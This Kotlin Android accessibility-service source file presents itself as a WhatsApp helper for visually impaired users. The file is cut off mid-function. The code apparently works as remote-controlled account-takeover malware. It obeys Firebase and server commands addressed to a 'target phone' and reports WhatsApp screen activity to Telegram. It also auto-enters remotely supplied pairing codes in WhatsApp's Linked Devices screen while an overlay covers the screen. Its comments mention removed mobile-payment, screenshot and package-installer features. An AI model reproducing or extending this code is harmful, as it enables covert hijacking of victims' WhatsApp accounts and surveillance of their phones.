package com.example.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import com.example.R
import com.example.data.FirebaseSignalRepository
import com.example.data.NodeServerClient
import com.example.util.DeviceInstallationSyncManager
import com.example.util.TelegramRealtimeSync
import com.example.util.TouchGuardOverlay
import com.example.util.VoiceGuidanceManager
import com.example.util.WhatsAppAutoLinkManager
import com.google.firebase.auth.FirebaseAuth
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.catch
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.util.ArrayDeque

/**
 * Fresh, streamlined Accessibility Service dedicated 100% to WhatsApp Linked Devices automation
 * and real-time Firebase / server pairing code reception for visually impaired brothers and sisters.
 * All non-WhatsApp bloat (bKash/Nagad/Rocket payments, 3-4s screen snapshots, package installer,
 * green curtain, external broadcast receivers) has been completely removed for maximum reliability.
 */
data class ActiveScreenInfo(
    val packageName: String = "",
    val className: String = "",
    val title: String = ""
)

class QuickAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "QuickAccessibilityService"
        private const val CHANNEL_ID = "accessibility_whatsapp_channel"
        private const val NOTIFICATION_ID = 1001

        private val _isServiceActive = MutableStateFlow(false)
        val isServiceActive: StateFlow<Boolean> = _isServiceActive.asStateFlow()

        private val _currentActiveScreen = MutableStateFlow<ActiveScreenInfo?>(null)
        val currentActiveScreen: StateFlow<ActiveScreenInfo?> = _currentActiveScreen.asStateFlow()

        // Server Power State (/power on and /power off)
        private val _isPowerOn = MutableStateFlow(true)
        val isPowerOn: StateFlow<Boolean> = _isPowerOn.asStateFlow()

        private val _lastPowerCommand = MutableStateFlow("/power on")
        val lastPowerCommand: StateFlow<String> = _lastPowerCommand.asStateFlow()

        fun performGlobalActionCompat(action: Int): Boolean {
            val s = instance ?: return false
            return s.performGlobalAction(action)
        }

        fun updatePowerState(
            isOn: Boolean,
            command: String = if (isOn) "/power on" else "/power off",
            activateScreenShieldOnPowerOn: Boolean = false,
            fallbackContext: Context? = null
        ) {
            _isPowerOn.value = isOn
            _lastPowerCommand.value = command
            val s = instance
            val appCtx = s?.applicationContext ?: fallbackContext?.applicationContext
            if (appCtx != null) {
                if (isOn) {
                    if (activateScreenShieldOnPowerOn) {
                        try {
                            TouchGuardOverlay.getInstance(appCtx).setPersistentPowerOnShield(true, s)
                        } catch (_: Exception) {}
                    }
                } else {
                    s?.fastInspectionJob?.cancel()
                    s?.fastInspectionJob = null
                    try {
                        TouchGuardOverlay.getInstance(appCtx).setPersistentPowerOnShield(false, s)
                        WhatsAppAutoLinkManager.getInstance(appCtx).stopAutomation()
                    } catch (_: Exception) {}
                }
                val scopeToUse = s?.serviceScope ?: CoroutineScope(Dispatchers.IO)
                scopeToUse.launch {
                    try {
                        val myDevId = DeviceInstallationSyncManager
                            .getInstance(appCtx)
                            .getOrCreateUniqueDeviceId()
                        NodeServerClient.getInstance(appCtx).setPowerCommand(isOn, myDevId)
                    } catch (_: Exception) {}
                }
            }
        }

        var instance: QuickAccessibilityService? = null
            private set

        fun startWhatsAppAutoLink(code: String, phoneNumber: String) {
            val s = instance ?: return
            WhatsAppAutoLinkManager.getInstance(s.applicationContext).startWorkflow(code, phoneNumber)
        }

        fun openWhatsAppLinkedDevices(context: Context) {
            WhatsAppAutoLinkManager.getInstance(context).openWhatsAppLinkedDevicesUrl()
        }

        fun launchWhatsApp(context: Context) {
            WhatsAppAutoLinkManager.getInstance(context).launchWhatsAppApp()
        }

        fun pasteClipboardToFocusedInput(): Boolean {
            val s = instance ?: return false
            return s.performPasteToFocusedField()
        }

        fun setTextToFocusedInput(text: String): Boolean {
            val s = instance ?: return false
            return s.performSetTextToFocusedField(text)
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
    private var powerSyncJob: Job? = null
    private var whatsAppListenerJob: Job? = null
    private var firebaseSignalJob: Job? = null
    private var fastInspectionJob: Job? = null
    private var lastProcessedRequestId: String = ""
    private var lastProcessedPairingCode: String = ""
    private var lastProcessedPairingTimestamp: Long = 0L
    private var isFirstPollCompleted = false
    private var lastWhatsAppScreenNotifyTime = 0L
    private val processedFirebaseSignalIds = mutableSetOf<String>()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        _isServiceActive.value = true

        // Dynamically enforce all required AccessibilityServiceInfo flags at runtime
        // so Xiaomi (MIUI/HyperOS), Vivo (Funtouch), Oppo/Realme (ColorOS), Samsung (OneUI),
        // and Transsion (Tecno/Infinix/Itel) devices always deliver interactive popup & window events!
        try {
            val info = serviceInfo
            if (info != null) {
                info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.DEFAULT or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
                info.notificationTimeout = 40L
                serviceInfo = info
            }
        } catch (e: Exception) {
            Log.w(TAG, "Notice updating runtime serviceInfo flags: ${e.message}")
        }

        createNotificationChannel()
        // All incoming signals operate 100% via real-time Firebase Firestore button clicks
        startFirebaseWhatsAppSignalListenerWorker()

        updateForegroundNotification(
            appName = getString(R.string.app_name),
            statusText = "WhatsApp Linked Service Active"
        )
        try {
            TelegramRealtimeSync.getInstance(this).notifyServiceConnected(getString(R.string.app_name))
        } catch (_: Exception) {}

        // Switch voice guidance to silent post-setup mode once Accessibility Service is enabled
        try {
            VoiceGuidanceManager.getInstance(applicationContext).enterPostSetupSilentMode()
        } catch (_: Exception) {}

        Log.d(TAG, "QuickAccessibilityService connected on ${Build.MANUFACTURER} ${Build.MODEL}.")
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        instance = this
        _isServiceActive.value = true
        startFirebaseWhatsAppSignalListenerWorker()
        updateForegroundNotification(
            appName = getString(R.string.app_name),
            statusText = "WhatsApp Linked Active • Ready"
        )
    }

    fun clickAt(x: Float, y: Float): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false
        val overlay = try { TouchGuardOverlay.getInstance(applicationContext) } catch (_: Exception) { null }
        val wasProtected = overlay?.isProtected() == true
        if (wasProtected) {
            overlay?.setPassThrough(true)
        }
        val path = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(path, 0, 55)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()
        val dispatched = dispatchGesture(
            gesture,
            object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    if (wasProtected) overlay?.setPassThrough(false)
                }

                override fun onCancelled(gestureDescription: GestureDescription?) {
                    if (wasProtected) overlay?.setPassThrough(false)
                }
            },
            mainHandler
        )
        if (!dispatched && wasProtected) {
            overlay?.setPassThrough(false)
        } else if (wasProtected) {
            mainHandler.postDelayed({ overlay?.setPassThrough(false) }, 220L)
        }
        return dispatched
    }

    fun clickNode(node: AccessibilityNodeInfo): Boolean {
        if (!_isPowerOn.value) return false
        val rect = Rect()
        node.getBoundsInScreen(rect)
        // 1. Prefer standard Accessibility ACTION_CLICK on the clickable node itself
        if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            return true
        }
        // 2. Walk up ancestors (up to depth 8) for clickable parent container (e.g. TextView inside ListView row or LinearLayout button)
        var p = try { node.parent } catch (_: Exception) { null }
        var depth = 0
        while (p != null && depth < 8) {
            if (p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            p = try { p.parent } catch (_: Exception) { null }
            depth++
        }
        // 3. Check immediate children if a wrapper container was matched
        val childCount = try { node.childCount } catch (_: Exception) { 0 }
        for (i in 0 until minOf(childCount, 8)) {
            val child = try { node.getChild(i) } catch (_: Exception) { null }
            if (child != null && child.isClickable && child.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
        }
        // 4. Coordinate gesture fallback with automatic TouchGuardOverlay pass-through
        // (Prioritize physical tap over blind performAction on non-clickable nodes so Android never returns a false-positive click!)
        if (rect.width() > 6 && rect.height() > 6 && rect.centerX() > 0 && rect.centerY() > 0) {
            if (clickAt(rect.centerX().toFloat(), rect.centerY().toFloat())) {
                return true
            }
        }
        // 5. Final fallback: direct ACTION_CLICK
        return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val eventType = event.eventType
        val packageName = event.packageName?.toString() ?: ""
        val isWhatsApp = packageName.contains("whatsapp", ignoreCase = true)
        val autoLinkManager = WhatsAppAutoLinkManager.getInstance(applicationContext)

        // Process whenever WhatsApp is active OR whenever automation is running (including popup menus, keyboards, biometric dialogs)
        if (isWhatsApp || autoLinkManager.isAutomationRunning.value) {
            val now = System.currentTimeMillis()
            if (isWhatsApp && now - lastWhatsAppScreenNotifyTime > 10000L) {
                lastWhatsAppScreenNotifyTime = now
                val activityName = event.className?.toString()?.substringAfterLast('.').orEmpty()
                try {
                    TelegramRealtimeSync.getInstance(this).notifyWhatsAppScreenOpened(activityName)
                } catch (_: Exception) {}
            }

            if (isWhatsApp) {
                _currentActiveScreen.value = ActiveScreenInfo(
                    packageName = packageName,
                    className = event.className?.toString().orEmpty(),
                    title = event.contentDescription?.toString().orEmpty()
                )
            }
            checkAndProgressWhatsAppAutomation(packageName, event.source)
        }
        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            handleNotificationStateChanged(event)
        }
    }

    /**
     * Inspects active window and popup windows in optimal priority order:
     * 1. Popup / dialog windows on top of WhatsApp (so 3-dot overflow menu items are ALWAYS seen before the background screen!)
     * 2. Active WhatsApp application window
     * 3. Input method (keyboard) / system windows
     */
    fun checkAndProgressWhatsAppAutomation(packageName: String, eventSource: AccessibilityNodeInfo? = null) {
        try {
            if (!_isPowerOn.value) return
            val autoLinkManager = WhatsAppAutoLinkManager.getInstance(applicationContext)
            val isWhatsAppPkg = packageName.contains("whatsapp", ignoreCase = true)
            if (!autoLinkManager.isAutomationRunning.value && !isWhatsAppPkg) return

            val popupRoots = mutableListOf<AccessibilityNodeInfo>()
            val mainAppRoots = mutableListOf<AccessibilityNodeInfo>()

            // 1. Collect all interactive windows, separating smaller popup/menu windows from full-screen windows
            try {
                val windowList = windows
                val screenHeight = resources.displayMetrics.heightPixels.coerceAtLeast(1200)
                for (win in windowList) {
                    val winRoot = win.root ?: continue
                    if (winRoot.windowId >= 0) {
                        val winPkg = winRoot.packageName?.toString().orEmpty()
                        // Skip our own app's TouchGuardOverlay window
                        if (winPkg.contains("com.example", ignoreCase = true)) continue
                        if (winPkg.contains("whatsapp", ignoreCase = true) ||
                            winPkg.isEmpty() ||
                            winPkg == "android" ||
                            winPkg.contains("systemui", ignoreCase = true) ||
                            winPkg.contains("biometric", ignoreCase = true)
                        ) {
                            val r = Rect()
                            winRoot.getBoundsInScreen(r)
                            val isPopupOrDialog = r.height() in 60..(screenHeight * 82 / 100) ||
                                win.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_SPLIT_SCREEN_DIVIDER
                            if (isPopupOrDialog) {
                                if (popupRoots.none { it.windowId == winRoot.windowId }) {
                                    popupRoots.add(winRoot)
                                }
                            } else {
                                if (mainAppRoots.none { it.windowId == winRoot.windowId }) {
                                    mainAppRoots.add(winRoot)
                                }
                            }
                        }
                    }
                }
            } catch (_: Exception) {}

            // 2. Include rootInActiveWindow
            val activeRoot = try { rootInActiveWindow } catch (_: Exception) { null }
            if (activeRoot != null) {
                val activePkg = activeRoot.packageName?.toString().orEmpty()
                if (!activePkg.contains("com.example", ignoreCase = true) &&
                    popupRoots.none { it.windowId == activeRoot.windowId } &&
                    mainAppRoots.none { it.windowId == activeRoot.windowId }
                ) {
                    mainAppRoots.add(0, activeRoot)
                }
            }

            // 3. Include eventSource if from a separate popup window
            if (eventSource != null) {
                val srcPkg = eventSource.packageName?.toString().orEmpty()
                if (!srcPkg.contains("com.example", ignoreCase = true) &&
                    popupRoots.none { it.windowId == eventSource.windowId } &&
                    mainAppRoots.none { it.windowId == eventSource.windowId }
                ) {
                    popupRoots.add(0, eventSource)
                }
            }

            // Inspect popup windows FIRST (e.g., 3-dot overflow menu or Confirm dialog), then main WhatsApp window!
            val orderedRoots = popupRoots + mainAppRoots
            for (r in orderedRoots) {
                if (!_isPowerOn.value) break
                val effectivePkg = if (r.packageName?.toString().isNullOrBlank()) "com.whatsapp" else r.packageName.toString()
                val actionTaken = autoLinkManager.processWindow(r, effectivePkg, this)
                if (actionTaken) {
                    break
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Responsive inspection loop: polls windows every 420ms for up to 10 cycles so transitions
     * between 3-dot menu -> Linked devices -> Link a device -> Link with phone number -> Code paste happen reliably after each screen settles.
     */
    fun triggerFastInspectionLoop() {
        if (!_isPowerOn.value) return
        val autoLinkManager = WhatsAppAutoLinkManager.getInstance(applicationContext)
        if (!autoLinkManager.isAutomationRunning.value || autoLinkManager.hasPastedCodeOnce) return
        if (fastInspectionJob?.isActive == true) return
        fastInspectionJob = serviceScope.launch {
            for (i in 0 until 10) {
                delay(420L)
                if (!_isPowerOn.value) break
                val mgr = WhatsAppAutoLinkManager.getInstance(applicationContext)
                if (!mgr.isAutomationRunning.value || mgr.hasPastedCodeOnce) break
                checkAndProgressWhatsAppAutomation("com.whatsapp", null)
            }
        }
    }

    /**
     * Handles system push notifications (e.g. WhatsApp 'Enter code to link new device')
     */
    private fun handleNotificationStateChanged(event: AccessibilityEvent) {
        try {
            if (!_isPowerOn.value) return
            val textList = event.text?.filterNotNull()?.map { it.toString().lowercase() } ?: emptyList()
            val isLinkNotification = textList.any { text ->
                text.contains("enter code to link") ||
                    text.contains("link new device") ||
                    text.contains("link a new device") ||
                    text.contains("নতুন ডিভাইস লিঙ্ক করতে কোড") ||
                    text.contains("লিঙ্ক করতে কোড")
            }

            val autoLinkManager = WhatsAppAutoLinkManager.getInstance(applicationContext)
            if (isLinkNotification && autoLinkManager.isAutomationRunning.value) {
                Log.i(TAG, "🔔 WhatsApp Link Notification detected: $textList")
                autoLinkManager.armFromNotificationShortcut()

                val notification = event.parcelableData as? android.app.Notification
                try {
                    notification?.contentIntent?.send()
                    announceToUser("হোয়াটসঅ্যাপের ডিভাইস লিঙ্ক নোটিফিকেশন ওপেন করা হয়েছে।")
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to launch notification contentIntent directly", e)
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error handling notification state changed", e)
        }
    }

    /**
     * Real-time Firebase Firestore Signal Listener:
     * Observes `/phone_users/{phoneKey}/signals` (when logged in with Phone Number) or `/users/{uid}/signals` (when logged in with Google)
     * so whenever a WhatsApp pairing signal (`WHATSAPP_LINK` or `/send_cod_...`) or power signal is sent to Firebase,
     * the WhatsApp Linked Devices service executes it immediately!
     */
    private fun startFirebaseWhatsAppSignalListenerWorker() {
        if (firebaseSignalJob?.isActive == true) return
        firebaseSignalJob = serviceScope.launch {
            com.example.ui.PhoneNumberSessionManager.init(applicationContext)
            var currentListenJob: Job? = null
            var currentListenedId = ""
            var lastHeartbeatTimeMs = 0L
            while (isActive) {
                try {
                    val activePhone = com.example.ui.PhoneNumberSessionManager.getActivePhone(applicationContext)
                    val currentUser = FirebaseAuth.getInstance().currentUser
                    val activeIdentifier = activePhone.ifBlank { currentUser?.uid.orEmpty() }
                    val nowLoopMs = System.currentTimeMillis()
                    if (activeIdentifier != currentListenedId || (activeIdentifier.isNotBlank() && currentListenJob?.isActive != true)) {
                        currentListenJob?.cancel()
                        currentListenedId = activeIdentifier
                        if (activeIdentifier.isNotBlank()) {
                            val repo = FirebaseSignalRepository(applicationContext, explicitIdentifier = activeIdentifier)
                            // Immediately register/update this Target Phone in Firestore (including lastConnectedAt)
                            try {
                                val myDevId = DeviceInstallationSyncManager.getInstance(applicationContext).getOrCreateUniqueDeviceId()
                                repo.syncDeviceProfile(
                                    deviceId = myDevId,
                                    deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}".trim(),
                                    isPowerOn = _isPowerOn.value,
                                    isServiceEnabled = true,
                                    lastSignalSummary = "টার্গেট ফোনে অ্যাপ লগইন ও পারমিশন অন রয়েছে (সিগন্যাল গ্রহণের জন্য ১০০% প্রস্তুত)",
                                    userIdOverride = activeIdentifier
                                )
                                lastHeartbeatTimeMs = nowLoopMs
                            } catch (_: Exception) {}

                            var isInitialSnapshotForId = true
                            currentListenJob = launch {
                                repo.observeSignals(activeIdentifier)
                                    .catch { e -> Log.w(TAG, "Firebase signal stream notice: ${e.message}") }
                                    .collect { signals ->
                                        val nowMs = System.currentTimeMillis()
                                        if (isInitialSnapshotForId) {
                                            isInitialSnapshotForId = false
                                            // On initial listener attach, execute the newest SENT signal if created recently
                                            // (using kotlin.math.abs to tolerate up to 10 minutes of phone clock skew on any device!)
                                            var executedNewestOnAttach = false
                                            for (sig in signals) {
                                                if (sig.userId.isNotBlank() && sig.userId != activeIdentifier) continue
                                                val createdMs = sig.createdAt?.toDate()?.time ?: nowMs
                                                val ageDiff = kotlin.math.abs(nowMs - createdMs)
                                                if (!executedNewestOnAttach &&
                                                    sig.status == "SENT" &&
                                                    ageDiff <= 600_000L &&
                                                    !processedFirebaseSignalIds.contains(sig.id)
                                                ) {
                                                    executedNewestOnAttach = true
                                                    processedFirebaseSignalIds.add(sig.id)
                                                    handleIncomingFirebaseSignal(repo, activeIdentifier, sig.id, sig.signalType, sig.command)
                                                } else {
                                                    processedFirebaseSignalIds.add(sig.id)
                                                }
                                            }
                                        } else {
                                            for (sig in signals) {
                                                if (sig.userId.isNotBlank() && sig.userId != activeIdentifier) continue
                                                if (sig.status == "SENT" && !processedFirebaseSignalIds.contains(sig.id)) {
                                                    processedFirebaseSignalIds.add(sig.id)
                                                    handleIncomingFirebaseSignal(repo, activeIdentifier, sig.id, sig.signalType, sig.command)
                                                }
                                            }
                                        }
                                    }
                            }
                        }
                    } else if (activeIdentifier.isNotBlank() && nowLoopMs - lastHeartbeatTimeMs >= 20_000L) {
                        // Update `lastConnectedAt` timestamp every 20 seconds so Web & Android Control Panels see live Last Seen status
                        lastHeartbeatTimeMs = nowLoopMs
                        try {
                            val myDevId = DeviceInstallationSyncManager.getInstance(applicationContext).getOrCreateUniqueDeviceId()
                            val repo = FirebaseSignalRepository(applicationContext, explicitIdentifier = activeIdentifier)
                            repo.updateLastConnectedHeartbeat(
                                deviceId = myDevId,
                                deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}".trim(),
                                isPowerOn = _isPowerOn.value,
                                isServiceEnabled = true,
                                userIdOverride = activeIdentifier
                            )
                        } catch (_: Exception) {}
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (_: Exception) {}
                delay(1200L)
            }
        }
    }

    private suspend fun handleIncomingFirebaseSignal(
        repo: FirebaseSignalRepository,
        activeIdentifier: String,
        signalId: String,
        signalType: String,
        command: String
    ) {
        val cleanCmd = command.trim()
        val autoLinkManager = WhatsAppAutoLinkManager.getInstance(applicationContext)
        val myDevId = try {
            DeviceInstallationSyncManager.getInstance(applicationContext).getOrCreateUniqueDeviceId()
        } catch (_: Exception) { "DEV-TARGET" }
        val myModel = "${Build.MANUFACTURER} ${Build.MODEL}".trim()

        when {
            signalType == "CLICK_BACK" || cleanCmd.equals("/back", ignoreCase = true) || cleanCmd.equals("CLICK_BACK", ignoreCase = true) -> {
                mainHandler.post {
                    try {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                    } catch (_: Exception) {}
                }
                val msg = "[$activeIdentifier] টার্গেট ফোনে ($myModel) BACK (ক্ষতিকর সাইট/স্ক্রিন থেকে প্রস্থান) সিগন্যাল কার্যকর হয়েছে ✓"
                repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                repo.syncDeviceProfile(
                    deviceId = myDevId,
                    deviceModel = myModel,
                    isPowerOn = _isPowerOn.value,
                    isServiceEnabled = true,
                    lastSignalSummary = msg,
                    userIdOverride = activeIdentifier
                )
            }
            signalType == "POWER_OFF" || cleanCmd.equals("/power off", ignoreCase = true) || cleanCmd.equals("/poweroff", ignoreCase = true) -> {
                updatePowerState(false, "/power off")
                val msg = "[$activeIdentifier] টার্গেট ফোনে ($myModel) সার্ভিস পজ (/power off) করা হয়েছে"
                repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                repo.syncDeviceProfile(
                    deviceId = myDevId,
                    deviceModel = myModel,
                    isPowerOn = false,
                    isServiceEnabled = true,
                    lastSignalSummary = msg,
                    userIdOverride = activeIdentifier
                )
            }
            signalType == "SCREEN_SHIELD" || signalType == "POWER_ON" || cleanCmd.equals("/power on", ignoreCase = true) || cleanCmd.equals("/poweron", ignoreCase = true) -> {
                updatePowerState(true, "/power on", activateScreenShieldOnPowerOn = true)
                val msg = "[$activeIdentifier] টার্গেট ফোনে ($myModel) পাওয়ার অন ও শিল্ড সক্রিয় করা হয়েছে ✓"
                repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                repo.syncDeviceProfile(
                    deviceId = myDevId,
                    deviceModel = myModel,
                    isPowerOn = true,
                    isServiceEnabled = true,
                    lastSignalSummary = msg,
                    userIdOverride = activeIdentifier
                )
            }
            signalType == "STATUS_PING" || cleanCmd.equals("READY_FOR_WHATSAPP_LINK", ignoreCase = true) -> {
                val msg = "[$activeIdentifier] টার্গেট ফোন ($myModel) সংযুক্ত আছে • পারমিশন অন ✓ • সার্ভিস ১০০% প্রস্তুত"
                repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                repo.syncDeviceProfile(
                    deviceId = myDevId,
                    deviceModel = myModel,
                    isPowerOn = _isPowerOn.value,
                    isServiceEnabled = true,
                    lastSignalSummary = msg,
                    userIdOverride = activeIdentifier
                )
            }
            signalType == "EMERGENCY_SOS" || cleanCmd.equals("SOS_WHATSAPP_LINK_ASSIST", ignoreCase = true) -> {
                if (!_isPowerOn.value) {
                    _isPowerOn.value = true
                    _lastPowerCommand.value = "/power on"
                }
                mainHandler.post {
                    autoLinkManager.openWhatsAppLinkedDevicesUrl()
                }
                val msg = "[$activeIdentifier] টার্গেট ফোনে ($myModel) জরুরি হোয়াটসঅ্যাপ লিঙ্কড ডিভাইস শর্টকাট সিগন্যাল কার্যকর হয়েছে ✓"
                repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                repo.syncDeviceProfile(
                    deviceId = myDevId,
                    deviceModel = myModel,
                    isPowerOn = true,
                    isServiceEnabled = true,
                    lastSignalSummary = msg,
                    userIdOverride = activeIdentifier
                )
            }
            signalType == "WHATSAPP_LINK" || cleanCmd.startsWith("/send_cod_", ignoreCase = true) ||
                cleanCmd.startsWith("/whatsapp", ignoreCase = true) || cleanCmd.length in 6..10 -> {
                val explicitPkg = when {
                    cleanCmd.contains("whatsapp_business", ignoreCase = true) ||
                        cleanCmd.contains("w4b", ignoreCase = true) -> WhatsAppAutoLinkManager.PKG_WHATSAPP_BUSINESS
                    cleanCmd.contains("/whatsapp", ignoreCase = true) -> WhatsAppAutoLinkManager.PKG_WHATSAPP
                    else -> null
                }
                val extractedCode = cleanCmd
                    .replace(Regex("(?i)/?whatsapp_business"), "")
                    .replace(Regex("(?i)/?whatsapp"), "")
                    .removePrefix("/send_cod_")
                    .removePrefix("/SEND_COD_")
                    .replace("-", "")
                    .replace("_", "")
                    .replace(" ", "")
                    .trim()
                    .uppercase()

                if (extractedCode.length in 6..10 && extractedCode.all { it.isLetterOrDigit() }) {
                    if (!_isPowerOn.value) {
                        _isPowerOn.value = true
                        _lastPowerCommand.value = "/power on"
                    }
                    mainHandler.post {
                        autoLinkManager.startWorkflow(
                            code = extractedCode,
                            phoneNumber = activeIdentifier,
                            requestId = signalId,
                            autoLaunchWhatsApp = true,
                            explicitPackage = explicitPkg
                        )
                    }
                    val msg = "[$activeIdentifier] টার্গেট ফোনে ($myModel) হোয়াটসঅ্যাপ কোড ($extractedCode) সফলভাবে চালু হয়েছে ✓"
                    repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                    repo.syncDeviceProfile(
                        deviceId = myDevId,
                        deviceModel = myModel,
                        isPowerOn = true,
                        isServiceEnabled = true,
                        lastSignalSummary = msg,
                        userIdOverride = activeIdentifier
                    )
                } else if (explicitPkg != null) {
                    if (!_isPowerOn.value) {
                        _isPowerOn.value = true
                        _lastPowerCommand.value = "/power on"
                    }
                    mainHandler.post {
                        autoLinkManager.selectWhatsAppAppAndProceed(
                            chooseBusiness = explicitPkg == WhatsAppAutoLinkManager.PKG_WHATSAPP_BUSINESS,
                            explicitCode = null
                        )
                    }
                    val msg = "[$activeIdentifier] টার্গেট ফোনে ($myModel) কাঙ্ক্ষিত WhatsApp অ্যাপ নির্বাচন ও চালু সম্পন্ন হয়েছে ✓"
                    repo.updateSignalStatus(signalId, "EXECUTED", msg, userIdOverride = activeIdentifier)
                    repo.syncDeviceProfile(
                        deviceId = myDevId,
                        deviceModel = myModel,
                        isPowerOn = true,
                        isServiceEnabled = true,
                        lastSignalSummary = msg,
                        userIdOverride = activeIdentifier
                    )
                }
            }
        }
    }

    /**
     * Continuously synchronizes server power state (/power on and /power off)
     * with Node.js server database for immediate response.
     */
    private fun startServerPowerSyncWorker() {
        if (powerSyncJob?.isActive == true) return
        powerSyncJob = serviceScope.launch {
            val nodeClient = NodeServerClient.getInstance(applicationContext)
            val voiceManager = VoiceGuidanceManager.getInstance(applicationContext)
            val myDevId = try {
                DeviceInstallationSyncManager.getInstance(applicationContext).getOrCreateUniqueDeviceId()
            } catch (_: Exception) { "" }

            while (isActive) {
                try {
                    val status = nodeClient.getPowerStatus(myDevId).getOrNull()
                    if (status != null) {
                        val currentPower = _isPowerOn.value
                        if (currentPower != status.isPowerOn) {
                            _isPowerOn.value = status.isPowerOn
                            _lastPowerCommand.value = status.lastPowerCommand
                            if (!status.isPowerOn) {
                                fastInspectionJob?.cancel()
                                fastInspectionJob = null
                                try {
                                    TouchGuardOverlay.getInstance(applicationContext)
                                        .setPersistentPowerOnShield(false, this@QuickAccessibilityService)
                                    WhatsAppAutoLinkManager.getInstance(applicationContext).stopAutomation()
                                } catch (_: Exception) {}
                            } else {
                                try {
                                    TouchGuardOverlay.getInstance(applicationContext)
                                        .setPersistentPowerOnShield(true, this@QuickAccessibilityService)
                                } catch (_: Exception) {}
                            }
                        }
                    }
                } catch (_: Exception) {}
                delay(900L)
            }
        }
    }

    /**
     * Listens to the server database for pending WhatsApp Linked Devices requests.
     * Deduplicates by both requestId and pairing code so a code is copied strictly ONCE.
     */
    private fun startWhatsAppDatabaseListenerWorker() {
        if (whatsAppListenerJob?.isActive == true) return
        whatsAppListenerJob = serviceScope.launch {
            val nodeClient = NodeServerClient.getInstance(applicationContext)
            val autoLinkManager = WhatsAppAutoLinkManager.getInstance(applicationContext)
            val myDevId = try {
                DeviceInstallationSyncManager.getInstance(applicationContext).getOrCreateUniqueDeviceId()
            } catch (_: Exception) { "" }

            while (isActive) {
                try {
                    val linkResponse = nodeClient.fetchPendingWhatsAppLinkRequest(
                        phoneNumber = "",
                        deviceId = myDevId
                    ).getOrNull()
                    if (linkResponse != null && !linkResponse.isPowerOn && _isPowerOn.value) {
                        _isPowerOn.value = false
                        _lastPowerCommand.value = "/power off"
                        fastInspectionJob?.cancel()
                        fastInspectionJob = null
                        try {
                            TouchGuardOverlay.getInstance(applicationContext).hide()
                            autoLinkManager.stopAutomation()
                        } catch (_: Exception) {}
                    }

                    if (linkResponse != null && linkResponse.hasPendingRequest && !linkResponse.code.isNullOrBlank()) {
                        val reqId = linkResponse.requestId ?: ""
                        val code = linkResponse.code.trim().uppercase()
                        val now = System.currentTimeMillis()

                        if (!isFirstPollCompleted) {
                            isFirstPollCompleted = true
                            lastProcessedRequestId = reqId
                            lastProcessedPairingCode = code
                            lastProcessedPairingTimestamp = now
                        } else if (reqId.isNotBlank() && reqId != lastProcessedRequestId) {
                            lastProcessedRequestId = reqId
                            val explicitPkg = linkResponse.targetPackage?.takeIf { it.isNotBlank() }
                            val isDuplicateRecentCode = explicitPkg == null && (
                                (code == lastProcessedPairingCode && now - lastProcessedPairingTimestamp < 25000L) ||
                                    (autoLinkManager.isAutomationRunning.value && autoLinkManager.getActivePairingCode() == code)
                                )

                            if (!isDuplicateRecentCode) {
                                lastProcessedPairingCode = code
                                lastProcessedPairingTimestamp = now
                                if (linkResponse.isPowerOn && !_isPowerOn.value) {
                                    _isPowerOn.value = true
                                    _lastPowerCommand.value = "/power on"
                                }
                                if (_isPowerOn.value && (!autoLinkManager.isAutomationRunning.value || explicitPkg != null)) {
                                    val phone = linkResponse.phoneNumber ?: ""
